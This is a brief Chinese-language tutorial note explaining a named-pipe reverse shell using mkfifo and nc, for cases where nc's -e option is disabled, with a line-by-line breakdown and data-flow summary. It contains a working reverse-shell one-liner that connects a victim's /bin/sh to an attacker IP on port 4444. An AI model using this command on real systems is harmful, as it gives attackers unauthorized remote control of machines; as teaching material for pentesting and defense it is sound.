i普通反弹用不了后，可以看看管道反弹(前提nc 命令没被禁用，只不过禁用了-e参数)：

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 攻击者ip 4444 >/tmp/f
```

管道符号的意思是：把前面命令的输出数据做为后面命令的输入数据

rm命令所有人都可以用，真正限制我们的是那个文件是否有删掉的权限

/tmp目录是Linux系统全局公共临时目录，所有用户都能在里面新建，修改，删除文件

该命令解析：

先把 /tmp/f目录删除，之后用来做管道，不是必选，只有在之前建立过反弹shell的管道上重新建立才需把原来作为管道的目录删掉；

；分号表示多段命令依次顺序执行

mkfifo /tmp/f 在该目录下创建管道

cat /tmp/f 复制管道的数据

|/bin/sh -i 2>&1  在创建完管道后将管道输出的数据 作为 输入进入本地的sh,标准错误和和标准输出一起输出

|nc 攻击者ip 端口号>/tmp/f 用nc与攻击者建立TCP连接，并且把攻击者的输入写入管道里

数据流：

cat读管道-->交给受害者bash处理-->结果从nc发出去给攻击者
